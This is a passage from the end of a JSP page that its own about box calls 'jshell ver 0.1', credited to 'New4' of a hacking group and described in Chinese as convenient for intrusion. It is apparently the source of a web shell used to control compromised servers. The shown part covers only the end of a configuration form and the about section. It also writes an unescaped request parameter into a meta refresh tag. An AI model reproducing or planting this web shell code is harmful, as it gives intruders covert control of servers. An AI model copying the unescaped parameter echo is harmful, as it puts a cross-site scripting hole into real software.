				result += "<meta http-equiv=\"refresh\" content=\"2;url=" + request.getRequestURI() + "?action=" + request.getParameter("action") + "\">";
			} catch (JshellConfigException e) {
				result = "<font color=\"red\">" + e.getMessage() + "</font>"; 
			}

%>
<table align="center" width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
	<tr bgcolor="#FFFFFF">
		<td><%=result == "" ? "&nbsp;" : result%></td>
	</tr>
</table>
<%
		}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//==========================================================================================
// end of config form
	} else if (action.equals("about")) {
// start of about
//==========================================================================================
%>
<table border="0" align="center" width="600" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
	<tr bgcolor="#FFFFFF">
		<td align="center">&#20851;&#20110; jshell ver 0.1</td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td>&nbsp;&nbsp;&nbsp;&nbsp;&#22686;&#21152;&#20102;&#26174;&#31034;alxea&#25490;&#21517;&#30340;&#21151;&#33021;&#65292;&#36825;&#23545;&#20110;&#20837;&#20405;&#20013;&#20063;&#27604;&#36739;&#26041;&#20415;&#20123;&#65292;&#29256;&#26435;&#36824;&#26159;&#24402;&#20316;&#32773;&#30340;.</td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td align="right">darkst by <a href="mailto:376186027@qq.com">New4</a> and welcome to <a href="http://www.darkst.com" target="_blank">&#26263;&#32452;&#25216;&#26415;&#32852;&#30431;</a></td>
	</tr>
</table>
<%	
//==========================================================================================
	}
}
%>
</body>
</html>
